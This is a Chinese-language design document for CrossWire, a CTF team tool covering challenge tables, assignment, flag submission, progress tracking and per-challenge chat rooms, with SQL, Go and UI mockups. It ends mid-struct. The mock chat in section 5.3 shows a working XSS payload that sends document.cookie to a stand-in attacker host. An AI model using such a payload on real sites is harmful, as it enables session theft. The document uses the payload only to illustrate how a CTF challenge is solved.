# CrossWire 题目管理系统设计

> CTF 题目管理、分配、协作聊天室
> 
> Version: 1.0.0  
> Date: 2025-10-05

---

## 📑 目录

- [1. 系统概述](#1-系统概述)
- [2. 数据库设计](#2-数据库设计)
- [3. 功能设计](#3-功能设计)
- [4. 聊天室设计](#4-聊天室设计)
- [5. UI设计](#5-ui设计)
- [6. API设计](#6-api设计)

---

## 1. 系统概述

### 1.1 核心功能

CrossWire 题目管理系统允许管理员在频道内：

- ✅ **创建题目**：添加 CTF 题目信息（名称、类型、分值、描述等）
- ✅ **分配题目**：将题目分配给特定成员或小组
- ✅ **独立聊天室**：每个题目自动创建独立聊天室
- ✅ **进度跟踪**：实时查看题目解答进度
- ✅ **提交管理**：记录 Flag 提交历史
- ✅ **协作讨论**：团队成员在题目聊天室中协作

### 1.2 架构图

```
频道 (Channel)
  │
  ├─ 主聊天室 (主频道消息)
  │   ├─ 系统消息
  │   ├─ 成员聊天
  │   └─ 通知消息
  │
  └─ 题目管理
      ├─ 题目列表
      │   ├─ Web-100 [分配: alice, bob]
      │   ├─ Pwn-200 [分配: charlie]
      │   └─ Crypto-300 [未分配]
      │
      └─ 题目聊天室
          ├─ #Web-100 聊天室
          │   ├─ alice: 发现SQL注入点
          │   ├─ bob: 已绕过WAF
          │   └─ [文件] exploit.py
          │
          ├─ #Pwn-200 聊天室
          │   └─ charlie: 正在分析堆溢出
          │
          └─ #Crypto-300 聊天室
              └─ (空)
```

---

## 2. 数据库设计

### 2.1 新增表总览

需要在频道数据库中新增 **5 个表**：

| 表名 | 字段数 | 说明 |
|------|--------|------|
| `challenges` | 18 | 题目基本信息 |
| `challenge_assignments` | 7 | 题目分配关系 |
| `challenge_progress` | 10 | 题目进度记录 |
| `challenge_submissions` | 9 | Flag提交记录 |
| `challenge_hints` | 8 | 题目提示 |

---

### 2.2 challenges（题目表）

**用途：** 存储 CTF 题目的基本信息

**主键：** `id` (UUID)  
**外键：** `channel_id` → `channels(id)`, `created_by` → `members(id)`

**字段详细说明：**

| 字段名 | 数据类型 | 约束 | 默认值 | 说明 | 示例值 |
|--------|----------|------|--------|------|--------|
| `id` | TEXT | PRIMARY KEY | - | 题目UUID | `challenge-550e8400` |
| `channel_id` | TEXT | FK, NOT NULL | - | 所属频道ID | `channel-uuid` |
| `title` | TEXT | NOT NULL | - | 题目标题 | `SQL注入登录绕过` |
| `category` | TEXT | NOT NULL | - | 题目分类 | `Web`, `Pwn`, `Reverse`, `Crypto`, `Misc`, `Forensics` |
| `difficulty` | TEXT | NOT NULL | - | 难度等级 | `Easy`, `Medium`, `Hard`, `Insane` |
| `points` | INTEGER | NOT NULL | - | 分值 | `100`, `200`, `500` |
| `description` | TEXT | NOT NULL | - | 题目描述 | `绕过登录页面的身份验证...` |
| `flag_format` | TEXT | - | NULL | Flag格式说明 | `flag{...}` |
| `flag` | TEXT | - | NULL | **Flag明文（所有人可见）** | `flag{sql_1nj3ct10n}` |
| `url` | TEXT | - | NULL | 题目链接 | `http://target.com:8080` |
| `attachments` | TEXT | - | NULL | 附件文件ID列表（JSON） | `["file-id-1", "file-id-2"]` |
| `tags` | TEXT | - | NULL | 标签（JSON数组） | `["sqli", "waf-bypass"]` |
| `status` | TEXT | NOT NULL | `'open'` | 题目状态 | `'open'`, `'solved'`, `'closed'` |
| `solved_by` | TEXT | - | NULL | 解决者ID列表（JSON） | `["user-1", "user-2"]` |
| `solved_at` | INTEGER | - | NULL | 解决时间 | Unix纳秒 |
| `created_by` | TEXT | FK, NOT NULL | - | 创建者ID | `admin-uuid` |
| `created_at` | INTEGER | NOT NULL | - | 创建时间 | Unix纳秒 |
| `updated_at` | INTEGER | NOT NULL | - | 更新时间 | Unix纳秒 |
| `metadata` | TEXT | - | NULL | 扩展元数据（JSON） | `{"author":"admin"}` |

**SQL 定义：**

```sql
CREATE TABLE challenges (
    id              TEXT PRIMARY KEY,
    channel_id      TEXT NOT NULL,
    title           TEXT NOT NULL,
    category        TEXT NOT NULL,
    difficulty      TEXT NOT NULL,
    points          INTEGER NOT NULL,
    description     TEXT NOT NULL,
    flag_format     TEXT,
    flag            TEXT,                       -- Flag明文，所有人可见
    url             TEXT,
    attachments     TEXT,
    tags            TEXT,
    status          TEXT NOT NULL DEFAULT 'open',
    solved_by       TEXT,
    solved_at       INTEGER,
    created_by      TEXT NOT NULL,
    created_at      INTEGER NOT NULL,
    updated_at      INTEGER NOT NULL,
    metadata        TEXT,
    FOREIGN KEY(channel_id) REFERENCES channels(id) ON DELETE CASCADE,
    FOREIGN KEY(created_by) REFERENCES members(id) ON DELETE SET NULL,
    CHECK(category IN ('Web', 'Pwn', 'Reverse', 'Crypto', 'Misc', 'Forensics')),
    CHECK(difficulty IN ('Easy', 'Medium', 'Hard', 'Insane')),
    CHECK(status IN ('open', 'solved', 'closed')),
    CHECK(points > 0 AND points <= 1000)
);

CREATE INDEX idx_challenges_channel ON challenges(channel_id);
CREATE INDEX idx_challenges_category ON challenges(channel_id, category);
CREATE INDEX idx_challenges_status ON challenges(channel_id, status);
CREATE INDEX idx_challenges_created_at ON challenges(created_at DESC);
```

---

### 2.3 challenge_assignments（题目分配表）

**用途：** 记录题目分配给哪些成员

**主键：** `(challenge_id, member_id)` 复合主键  
**外键：** `challenge_id` → `challenges(id)`, `member_id` → `members(id)`

**字段详细说明：**

| 字段名 | 数据类型 | 约束 | 默认值 | 说明 | 示例值 |
|--------|----------|------|--------|------|--------|
| `challenge_id` | TEXT | PK, FK, NOT NULL | - | 题目ID | `challenge-uuid` |
| `member_id` | TEXT | PK, FK, NOT NULL | - | 成员ID | `user-uuid` |
| `assigned_by` | TEXT | FK, NOT NULL | - | 分配者ID | `admin-uuid` |
| `assigned_at` | INTEGER | NOT NULL | - | 分配时间 | Unix纳秒 |
| `role` | TEXT | NOT NULL | `'member'` | 角色 | `'lead'`, `'member'` |
| `status` | TEXT | NOT NULL | `'assigned'` | 状态 | `'assigned'`, `'working'`, `'completed'` |
| `notes` | TEXT | - | NULL | 备注 | `负责SQL注入部分` |

**SQL 定义：**

```sql
CREATE TABLE challenge_assignments (
    challenge_id    TEXT NOT NULL,
    member_id       TEXT NOT NULL,
    assigned_by     TEXT NOT NULL,
    assigned_at     INTEGER NOT NULL,
    role            TEXT NOT NULL DEFAULT 'member',
    status          TEXT NOT NULL DEFAULT 'assigned',
    notes           TEXT,
    PRIMARY KEY (challenge_id, member_id),
    FOREIGN KEY(challenge_id) REFERENCES challenges(id) ON DELETE CASCADE,
    FOREIGN KEY(member_id) REFERENCES members(id) ON DELETE CASCADE,
    FOREIGN KEY(assigned_by) REFERENCES members(id) ON DELETE SET NULL,
    CHECK(role IN ('lead', 'member')),
    CHECK(status IN ('assigned', 'working', 'completed'))
);

CREATE INDEX idx_assignments_challenge ON challenge_assignments(challenge_id);
CREATE INDEX idx_assignments_member ON challenge_assignments(member_id);
CREATE INDEX idx_assignments_status ON challenge_assignments(status);
```

**说明：**
- `role = 'lead'`：题目负责人，有更多权限
- `role = 'member'`：协作成员
- 一个题目可以分配给多个人

---

### 2.4 challenge_progress（题目进度表）

**用途：** 记录题目解答进度和状态更新

**主键：** `id` (自增)  
**外键：** `challenge_id` → `challenges(id)`, `member_id` → `members(id)`

**字段详细说明：**

| 字段名 | 数据类型 | 约束 | 默认值 | 说明 | 示例值 |
|--------|----------|------|--------|------|--------|
| `id` | INTEGER | PK, AUTOINCREMENT | - | 记录ID | `1` |
| `challenge_id` | TEXT | FK, NOT NULL | - | 题目ID | `challenge-uuid` |
| `member_id` | TEXT | FK, NOT NULL | - | 成员ID | `user-uuid` |
| `progress` | INTEGER | NOT NULL | 0 | 进度百分比（0-100） | `60` |
| `status` | TEXT | NOT NULL | `'not_started'` | 状态 | `'not_started'`, `'in_progress'`, `'blocked'`, `'completed'` |
| `summary` | TEXT | - | NULL | 进度摘要 | `已找到SQL注入点，正在绕过WAF` |
| `findings` | TEXT | - | NULL | 发现内容（JSON） | `{"injection_point":"/login","method":"POST"}` |
| `blockers` | TEXT | - | NULL | 阻塞问题 | `需要先拿到管理员密码` |
| `updated_at` | INTEGER | NOT NULL | - | 更新时间 | Unix纳秒 |
| `metadata` | TEXT | - | NULL | 扩展元数据 | JSON |

**SQL 定义：**

```sql
CREATE TABLE challenge_progress (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    challenge_id    TEXT NOT NULL,
    member_id       TEXT NOT NULL,
    progress        INTEGER NOT NULL DEFAULT 0,
    status          TEXT NOT NULL DEFAULT 'not_started',
    summary         TEXT,
    findings        TEXT,
    blockers        TEXT,
    updated_at      INTEGER NOT NULL,
    metadata        TEXT,
    FOREIGN KEY(challenge_id) REFERENCES challenges(id) ON DELETE CASCADE,
    FOREIGN KEY(member_id) REFERENCES members(id) ON DELETE CASCADE,
    CHECK(progress >= 0 AND progress <= 100),
    CHECK(status IN ('not_started', 'in_progress', 'blocked', 'completed'))
);

CREATE INDEX idx_progress_challenge ON challenge_progress(challenge_id);
CREATE INDEX idx_progress_member ON challenge_progress(member_id);
CREATE INDEX idx_progress_updated ON challenge_progress(updated_at DESC);
```

---

### 2.5 challenge_submissions（提交记录表）

**用途：** 记录 Flag 提交历史（任何人都可提交）

**主键：** `id` (UUID)  
**外键：** `challenge_id` → `challenges(id)`, `member_id` → `members(id)`

**字段详细说明：**

| 字段名 | 数据类型 | 约束 | 默认值 | 说明 | 示例值 |
|--------|----------|------|--------|------|--------|
| `id` | TEXT | PRIMARY KEY | - | 提交UUID | `submission-uuid` |
| `challenge_id` | TEXT | FK, NOT NULL | - | 题目ID | `challenge-uuid` |
| `member_id` | TEXT | FK, NOT NULL | - | 提交者ID | `user-uuid` |
| `flag` | TEXT | NOT NULL | - | 提交的Flag明文 | `flag{sql_1nj3ct10n}` |
| `action` | TEXT | NOT NULL | - | 操作类型 | `'submit'`, `'update'` |
| `submitted_at` | INTEGER | NOT NULL | - | 提交时间 | Unix纳秒 |
| `ip_address` | TEXT | - | NULL | 提交IP | `192.168.1.100` |
| `metadata` | TEXT | - | NULL | 扩展元数据 | JSON |

**SQL 定义：**

```sql
CREATE TABLE challenge_submissions (
    id              TEXT PRIMARY KEY,
    challenge_id    TEXT NOT NULL,
    member_id       TEXT NOT NULL,
    flag            TEXT NOT NULL,
    action          TEXT NOT NULL,
    submitted_at    INTEGER NOT NULL,
    ip_address      TEXT,
    metadata        TEXT,
    FOREIGN KEY(challenge_id) REFERENCES challenges(id) ON DELETE CASCADE,
    FOREIGN KEY(member_id) REFERENCES members(id) ON DELETE CASCADE,
    CHECK(action IN ('submit', 'update'))
);

CREATE INDEX idx_submissions_challenge ON challenge_submissions(challenge_id);
CREATE INDEX idx_submissions_member ON challenge_submissions(member_id);
CREATE INDEX idx_submissions_time ON challenge_submissions(submitted_at DESC);
```

---

### 2.6 challenge_hints（题目提示表）

**用途：** 存储题目的提示信息（可分阶段解锁）

**主键：** `id` (UUID)  
**外键：** `challenge_id` → `challenges(id)`, `created_by` → `members(id)`

**字段详细说明：**

| 字段名 | 数据类型 | 约束 | 默认值 | 说明 | 示例值 |
|--------|----------|------|--------|------|--------|
| `id` | TEXT | PRIMARY KEY | - | 提示UUID | `hint-uuid` |
| `challenge_id` | TEXT | FK, NOT NULL | - | 题目ID | `challenge-uuid` |
| `order_num` | INTEGER | NOT NULL | - | 提示顺序（1,2,3...） | `1` |
| `content` | TEXT | NOT NULL | - | 提示内容 | `尝试检查登录表单的参数` |
| `cost` | INTEGER | - | 0 | 解锁成本（可选） | `10` |
| `unlocked_by` | TEXT | - | NULL | 已解锁成员ID列表（JSON） | `["user-1"]` |
| `created_by` | TEXT | FK, NOT NULL | - | 创建者ID | `admin-uuid` |
| `created_at` | INTEGER | NOT NULL | - | 创建时间 | Unix纳秒 |

**SQL 定义：**

```sql
CREATE TABLE challenge_hints (
    id              TEXT PRIMARY KEY,
    challenge_id    TEXT NOT NULL,
    order_num       INTEGER NOT NULL,
    content         TEXT NOT NULL,
    cost            INTEGER DEFAULT 0,
    unlocked_by     TEXT,
    created_by      TEXT NOT NULL,
    created_at      INTEGER NOT NULL,
    FOREIGN KEY(challenge_id) REFERENCES challenges(id) ON DELETE CASCADE,
    FOREIGN KEY(created_by) REFERENCES members(id) ON DELETE SET NULL,
    UNIQUE(challenge_id, order_num)
);

CREATE INDEX idx_hints_challenge ON challenge_hints(challenge_id, order_num);
```

---

### 2.7 修改 messages 表

需要在 `messages` 表中**新增字段**，用于关联题目聊天室：

```sql
-- 添加新字段
ALTER TABLE messages ADD COLUMN challenge_id TEXT;
ALTER TABLE messages ADD COLUMN room_type TEXT DEFAULT 'main';

-- 添加外键约束（SQLite 需要重建表）
-- room_type: 'main' = 主频道, 'challenge' = 题目聊天室
-- challenge_id: 题目聊天室时指向 challenges(id)，主频道时为 NULL

-- 创建索引
CREATE INDEX idx_messages_challenge ON messages(challenge_id, timestamp DESC);
CREATE INDEX idx_messages_room_type ON messages(channel_id, room_type, timestamp DESC);
```

**新增字段说明：**

| 字段名 | 数据类型 | 约束 | 默认值 | 说明 |
|--------|----------|------|--------|------|
| `challenge_id` | TEXT | FK | NULL | 题目ID（题目聊天室时有值） |
| `room_type` | TEXT | CHECK | `'main'` | 聊天室类型（`'main'`/`'challenge'`） |

---

## 3. 功能设计

### 3.1 题目管理功能

#### 3.1.1 创建题目

**权限：** 频道管理员（Owner/Admin）

**流程：**

```go
func (s *Server) CreateChallenge(config *ChallengeConfig) (*Challenge, error) {
    // 1. 验证权限
    if !member.HasPermission(PermCreateChallenge) {
        return nil, ErrPermissionDenied
    }
    
    // 2. 创建题目
    challenge := &Challenge{
        ID:          uuid.New().String(),
        ChannelID:   config.ChannelID,
        Title:       config.Title,
        Category:    config.Category,
        Difficulty:  config.Difficulty,
        Points:      config.Points,
        Description: config.Description,
        Flag:        config.Flag,  // 明文存储，对所有人可见
        Status:      "open",
        CreatedBy:   member.ID,
        CreatedAt:   time.Now(),
    }
    
    // 3. 保存到数据库
    if err := s.db.SaveChallenge(challenge); err != nil {
        return nil, err
    }
    
    // 4. 自动创建题目聊天室
    if err := s.createChallengeRoom(challenge); err != nil {
        return nil, err
    }
    
    // 5. 广播系统消息
    s.BroadcastSystemMessage(&SystemMessage{
        Type:      SysMsgChallengeCreated,
        ActorID:   member.ID,
        TargetID:  challenge.ID,
        Content:   fmt.Sprintf("新题目：%s [%s-%d分]", challenge.Title, challenge.Category, challenge.Points),
    })
    
    return challenge, nil
}
```

---

#### 3.1.2 分配题目

**权限：** 频道管理员

**流程：**

```go
func (s *Server) AssignChallenge(challengeID string, memberIDs []string, role string) error {
    // 1. 验证权限
    if !operator.HasPermission(PermAssignChallenge) {
        return ErrPermissionDenied
    }
    
    // 2. 获取题目
    challenge, err := s.db.GetChallenge(challengeID)
    if err != nil {
        return err
    }
    
    // 3. 批量分配
    for _, memberID := range memberIDs {
        assignment := &ChallengeAssignment{
            ChallengeID: challengeID,
            MemberID:    memberID,
            AssignedBy:  operator.ID,
            AssignedAt:  time.Now(),
            Role:        role,
            Status:      "assigned",
        }
        
        if err := s.db.SaveAssignment(assignment); err != nil {
            return err
        }
        
        // 通知被分配者
        s.NotifyMember(memberID, &Notification{
            Type:    NotifyAssignment,
            Title:   "新题目分配",
            Content: fmt.Sprintf("你被分配了题目：%s", challenge.Title),
            Link:    fmt.Sprintf("/challenges/%s", challengeID),
        })
    }
    
    // 4. 更新题目聊天室权限（仅分配的成员可见）
    s.updateChallengeRoomAccess(challengeID, memberIDs)
    
    // 5. 广播系统消息
    s.BroadcastSystemMessage(&SystemMessage{
        Type:     SysMsgChallengeAssigned,
        ActorID:  operator.ID,
        TargetID: challengeID,
        Content:  fmt.Sprintf("%s 分配了题目给 %d 人", operator.Nickname, len(memberIDs)),
    })
    
    return nil
}
```

---

#### 3.1.3 提交/更新 Flag

**权限：** 任何成员（无需分配）

**流程：**

```go
func (s *Server) SubmitChallengeFlag(challengeID, memberID, flag string) error {
    // 1. 获取题目
    challenge, err := s.db.GetChallenge(challengeID)
    if err != nil {
        return err
    }
    
    if challenge.Status == "closed" {
        return ErrChallengeClosed
    }
    
    // 2. 记录提交历史
    submission := &ChallengeSubmission{
        ID:          uuid.New().String(),
        ChallengeID: challengeID,
        MemberID:    memberID,
        Flag:        flag,  // 明文存储
        Action:      "submit",
        SubmittedAt: time.Now(),
    }
    
    s.db.SaveSubmission(submission)
    
    // 3. 更新题目的Flag字段（覆盖之前的值）
    challenge.Flag = flag
    challenge.Status = "solved"
    challenge.UpdatedAt = time.Now()
    
    // 添加到solved_by列表（如果不存在）
    if !contains(challenge.SolvedBy, memberID) {
        challenge.SolvedBy = append(challenge.SolvedBy, memberID)
        if challenge.SolvedAt == 0 {
            challenge.SolvedAt = time.Now()
        }
    }
    
    s.db.UpdateChallenge(challenge)
    
    // 4. 广播题目更新（所有人可见Flag）
    s.BroadcastChallengeUpdate(challenge)
    
    // 5. 在题目聊天室发送消息
    member, _ := s.db.GetMember(memberID)
    s.SendToChallengeRoom(challengeID, &Message{
        Type:    MessageTypeSystem,
        Content: fmt.Sprintf("✅ %s 提交了 Flag: %s", member.Nickname, flag),
    })
    
    // 6. 广播到主频道
    s.BroadcastSystemMessage(&SystemMessage{
        Type:     SysMsgChallengeUpdated,
        ActorID:  memberID,
        TargetID: challengeID,
        Content:  fmt.Sprintf("✅ %s 提交了 %s 的Flag", member.Nickname, challenge.Title),
    })
    
    return nil
}
```

**说明：**
- ✅ **任何人都可以提交**：无需被分配到题目
- ✅ **Flag公开**：提交后所有人都能看到Flag
- ✅ **覆盖更新**：新提交的Flag会覆盖旧的Flag
- ✅ **历史记录**：所有提交都会记录在submissions表中

---

### 3.2 进度跟踪

#### 3.2.1 更新进度

```go
func (s *Server) UpdateProgress(challengeID, memberID string, progress int, summary string) error {
    progressRecord := &ChallengeProgress{
        ChallengeID: challengeID,
        MemberID:    memberID,
        Progress:    progress,
        Status:      determineStatus(progress),
        Summary:     summary,
        UpdatedAt:   time.Now(),
    }
    
    return s.db.SaveProgress(progressRecord)
}
```

#### 3.2.2 查看进度

```go
func (s *Server) GetChallengeProgress(challengeID string) (*ChallengeProgressSummary, error) {
    // 获取所有分配的成员
    assignments, _ := s.db.GetAssignments(challengeID)
    
    // 获取每个成员的最新进度
    summary := &ChallengeProgressSummary{
        ChallengeID: challengeID,
        Members:     make([]*MemberProgress, 0),
    }
    
    for _, assignment := range assignments {
        progress, _ := s.db.GetLatestProgress(challengeID, assignment.MemberID)
        summary.Members = append(summary.Members, &MemberProgress{
            MemberID:   assignment.MemberID,
            Nickname:   assignment.Member.Nickname,
            Progress:   progress.Progress,
            Status:     progress.Status,
            Summary:    progress.Summary,
            UpdatedAt:  progress.UpdatedAt,
        })
    }
    
    return summary, nil
}
```

---

## 4. 聊天室设计

### 4.1 聊天室类型

CrossWire 支持两种聊天室类型：

| 类型 | `room_type` | 说明 | 访问权限 |
|------|-------------|------|----------|
| **主频道** | `'main'` | 频道的主聊天室 | 所有成员 |
| **题目聊天室** | `'challenge'` | 每个题目的独立聊天室 | 仅分配到该题目的成员 |

---

### 4.2 题目聊天室创建

**自动创建：** 当题目被创建时，自动创建对应的聊天室

```go
func (s *Server) createChallengeRoom(challenge *Challenge) error {
    // 创建题目聊天室元数据
    room := &ChallengeRoom{
        ID:          challenge.ID,
        ChannelID:   challenge.ChannelID,
        ChallengeID: challenge.ID,
        Name:        fmt.Sprintf("#%s-%s", challenge.Category, challenge.Title),
        Type:        "challenge",
        CreatedAt:   time.Now(),
    }
    
    // 发送欢迎消息
    s.SendMessage(&Message{
        ID:          uuid.New().String(),
        ChannelID:   challenge.ChannelID,
        ChallengeID: challenge.ID,  // 关联题目
        RoomType:    "challenge",
        SenderID:    "system",
        Type:        MessageTypeSystem,
        Content: map[string]interface{}{
            "event": "room_created",
            "challenge": challenge,
            "message": fmt.Sprintf("题目聊天室已创建：%s", challenge.Title),
        },
        Timestamp: time.Now(),
    })
    
    return nil
}
```

---

### 4.3 消息隔离

**主频道消息：**
```go
// 发送到主频道
msg := &Message{
    ChannelID:   channelID,
    RoomType:    "main",        // 主频道
    ChallengeID: nil,           // 无题目关联
    Content:     "大家好",
}
```

**题目聊天室消息：**
```go
// 发送到题目聊天室
msg := &Message{
    ChannelID:   channelID,
    RoomType:    "challenge",   // 题目聊天室
    ChallengeID: challengeID,   // 关联题目
    Content:     "发现注入点在username参数",
}
```

**查询消息：**
```sql
-- 获取主频道消息
SELECT * FROM messages 
WHERE channel_id = ? 
  AND room_type = 'main' 
  AND deleted = 0
ORDER BY timestamp DESC 
LIMIT 50;

-- 获取题目聊天室消息
SELECT * FROM messages 
WHERE channel_id = ? 
  AND challenge_id = ? 
  AND room_type = 'challenge'
  AND deleted = 0
ORDER BY timestamp DESC 
LIMIT 50;
```

---

### 4.4 权限控制

```go
func (s *Server) CanAccessChallengeRoom(memberID, challengeID string) bool {
    // 1. 管理员可以访问所有聊天室
    member, _ := s.db.GetMember(memberID)
    if member.Role == RoleOwner || member.Role == RoleAdmin {
        return true
    }
    
    // 2. 检查是否分配到该题目
    assignment, err := s.db.GetAssignment(challengeID, memberID)
    if err != nil {
        return false
    }
    
    return assignment != nil
}

func (s *Server) SendToChallengeRoom(challengeID string, msg *Message) error {
    // 只发送给有权限的成员
    assignments, _ := s.db.GetAssignments(challengeID)
    
    for _, assignment := range assignments {
        s.SendToClient(assignment.MemberID, msg)
    }
    
    return nil
}
```

---

## 5. UI 设计

### 5.1 侧边栏布局

```
┌────────────────────────────────────────┐
│  CrossWire - CTF Team                  │
├────────────────────────────────────────┤
│  📢 主频道                              │
│     └─ 通用讨论                        │
│                                        │
│  📝 题目列表 (5)                        │
│     ├─ 🟢 Web                          │
│     │   ├─ #Web-100 SQL注入 ✓         │
│     │   ├─ #Web-200 XSS [你]          │
│     │   └─ #Web-300 XXE               │
│     │                                  │
│     ├─ 🔴 Pwn                          │
│     │   ├─ #Pwn-200 栈溢出 [alice]    │
│     │   └─ #Pwn-500 堆利用            │
│     │                                  │
│     ├─ 🔵 Reverse                      │
│     │   └─ #Rev-300 反编译            │
│     │                                  │
│     ├─ 🟡 Crypto                       │
│     │   └─ #Crypto-400 RSA            │
│     │                                  │
│     └─ 🟣 Misc                         │
│         └─ #Misc-100 隐写              │
│                                        │
│  👥 成员 (8)                            │
│     🟢 alice (队长) - Web              │
│     🟢 bob (队员) - Pwn                │
│     🔴 charlie (忙碌) - Reverse        │
│     🟡 david (离开) - Crypto           │
│                                        │
│  ⚙️ 设置                                │
└────────────────────────────────────────┘
```

**说明：**
- ✓：已解决
- [你]：你被分配
- [alice]：alice 被分配
- 颜色标识题目类别

---

### 5.2 题目详情页

```
┌─────────────────────────────────────────────────────────┐
│  题目详情                                          [X]   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  📝 Web-200 - XSS 绕过过滤                              │
│  难度: ⭐⭐ Medium  |  分值: 200                        │
│  状态: 🟢 进行中   |  分配: alice, bob                 │
│                                                         │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│                                                         │
│  📄 题目描述：                                          │
│  ────────────────────────────────────────────────────  │
│  绕过网站的 XSS 过滤机制，获取管理员 Cookie             │
│  URL: http://target.com:8080                           │
│                                                         │
│  Flag 格式: flag{...}                                  │
│                                                         │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│                                                         │
│  📎 附件：                                              │
│  [📁 源码.zip]  [📄 提示.txt]                          │
│                                                         │
│  🏷️ 标签：                                              │
│  #xss  #filter-bypass  #dom-xss                        │
│                                                         │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│                                                         │
│  📊 进度：                                              │
│  ────────────────────────────────────────────────────  │
│  alice (负责人)     ████████░░ 80%  正在构造 Payload   │
│  bob                ██████░░░░ 60%  分析过滤规则       │
│                                                         │
│  💡 提示 (2)：                                          │
│  ────────────────────────────────────────────────────  │
│  [🔓] 提示 1: 尝试使用事件处理器                       │
│  [🔒] 提示 2: [解锁] (cost: 10分)                      │
│                                                         │
│  📜 提交记录 (3)：                                      │
│  ────────────────────────────────────────────────────  │
│  alice    10:30  flag{test123}        ❌ 错误          │
│  bob      10:45  flag{xss_bypass}     ❌ 错误          │
│  alice    11:20  flag{dom_xss_ftw}    ✅ 正确          │
│                                                         │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│                                                         │
│  🚩 提交 Flag：                                         │
│  ┌─────────────────────────────────────┐              │
│  │ flag{                               │  [提交]      │
│  └─────────────────────────────────────┘              │
│                                                         │
│  [📝 更新进度]  [💬 进入聊天室]  [📊 查看详情]         │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

### 5.3 题目聊天室界面

```
┌──────────────────────────────────────────────────────────┐
│  #Web-200 XSS绕过过滤                     [题目详情] [X] │
├──────────────────────────────────────────────────────────┤
│  📌 置顶: 题目链接 http://target.com:8080               │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  │
│                                                          │
│  alice  10:25                                  [回复]   │
│  我发现输入会被 DOMPurify 过滤                          │
│  尝试了 <script> 标签被直接删除                         │
│                                                          │
│  bob  10:30                                    [回复]   │
│  可以试试事件处理器，比如 <img onerror=...>             │
│                                                          │
│  alice  10:35                      📁 payload.js [下载] │
│  写了个 fuzz 脚本，大家可以用                           │
│                                                          │
│  ┌─ 回复 bob ────────────────────────────────┐          │
│  │ 可以试试事件处理器...                     │          │
│  └──────────────────────────────────────────┘          │
│  alice  10:40                                           │
│  成功了！用 <svg/onload=alert(1)>                       │
│  ```javascript                                          │
│  <svg/onload=fetch('//attacker.com?c='+document.cookie)>│
│  ```                                                    │
│  #xss #success                                          │
│                                                          │
│  🤖 系统  10:45                                         │
│  alice 更新了进度: 80% - 构造 Payload 成功              │
│                                                          │
│  charlie (管理员) 10:50                        [回复]   │
│  👍 做得好！注意绕过 CSP                                 │
│                                                          │
│  alice  11:20                                           │
│  拿到了！flag{dom_xss_bypass_filter_2024}               │
│                                                          │
│  🤖 系统  11:20                                         │
│  🎉 alice 成功解出了题目！                              │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  │
│                                                          │
├──────────────────────────────────────────────────────────┤
│  [@提及] [#标签] [📎文件] [</> 代码] [😀 Emoji]         │
│  ┌────────────────────────────────────────────────────┐ │
│  │ 输入消息...                                        │ │
│  └────────────────────────────────────────────────────┘ │
│                                         [发送 (Ctrl+Enter)]│
└──────────────────────────────────────────────────────────┘
```

---

## 6. API 设计

### 6.1 题目管理 API

#### 6.1.1 创建题目

```go
// POST /api/challenges
type CreateChallengeRequest struct {
    Title       string   `json:"title"`
    Category    string   `json:"category"`
    Difficulty  string   `json:"difficulty"`
    Points      int      `json:"points"`
    Description string   `json:"description"`
    Flag        string   `json:"flag"`
    FlagFormat  string   `json:"flag_format"`
    URL         string   `json:"url"`
    Attachments []string `json:"attachments"`  // 文件ID列表
    Tags        []string `json:"tags"`
}

type CreateChallengeResponse struct {
    Success   bool       `json:"success"`
    Challenge *Challenge `json:"challenge"`
}
```

#### 6.1.2 获取题目列表

```go
// GET /api/challenges?channel_id=xxx&category=Web&status=open
type ListChallengesRequest struct {
    ChannelID  string `query:"channel_id"`
    Category   string `query:"category"`
    Status     string `query:"status"`
    AssignedTo string `query:"assigned_to"`  // 筛选分配给某人的
    Limit      int    `query:"limit"`
    Offset     int    `query:"offset"`
}

type ListChallengesResponse struct {
    Success    bool         `json:"success"`
    Challenges []*Challenge `json:"challenges"`
    Total      int          `json:"total"`
}
```

#### 6.1.3 分配题目

```go
// POST /api/challenges/:id/assign
type AssignChallengeRequest struct {
    MemberIDs []string `json:"member_ids"`
    Role      string   `json:"role"`        // 'lead' or 'member'
    Notes     string   `json:"notes"`
}

type AssignChallengeResponse struct {
    Success     bool                    `json:"success"`
    Assignments []*ChallengeAssignment  `json:"assignments"`
}
```

#### 6.1.4 提交 Flag

```go
// POST /api/challenges/:id/submit
type SubmitFlagRequest struct {
    Flag string `json:"flag"`
}

type SubmitFlagResponse struct {
    Success   bool   `json:"success"`
    IsCorrect bool   `json:"is_correct"`
    Message   string `json:"message"`
}
```

#### 6.1.5 更新进度

```go
// POST /api/challenges/:id/progress
type UpdateProgressRequest struct {
    Progress int    `json:"progress"`  // 0-100
    Status   string `json:"status"`
    Summary  string `json:"summary"`
    Findings string `json:"findings"`  // JSON
    Blockers string `json:"blockers"`
}

type UpdateProgressResponse struct {
    Success bool              `json:"success"`
    Progress *ChallengeProgress `json:"progress"`
}
```

---

### 6.2 聊天室 API

#### 6.2.1 发送消息到题目聊天室

```go
// POST /api/challenges/:id/messages
type SendChallengeMessageRequest struct {
    Type    string      `json:"type"`     // 'text', 'code', 'file'
    Content interface{} `json:"content"`
}

type SendChallengeMessageResponse struct {
    Success bool     `json:"success"`
    Message *Message `json:"message"`
}
```

#### 6.2.2 获取题目聊天室消息

```go
// GET /api/challenges/:id/messages?limit=50&before=msg-id
type GetChallengeMessagesRequest struct {
    ChallengeID string `path:"id"`
    Limit       int    `query:"limit"`
    Before      string `query:"before"`  // 消息ID，用于分页
}

type GetChallengeMessagesResponse struct {
    Success  bool       `json:"success"`
    Messages []*Message `json:"messages"`
    HasMore  bool       `json:"has_more"`
}
```

---

## 7. Go 数据结构定义

```go
package models

// Challenge 题目
type Challenge struct {
    ID          string    `json:"id" db:"id"`
    ChannelID   string    `json:"channel_id" db:"channel_id"`
    Title       string    `json:"title" db:"title"`
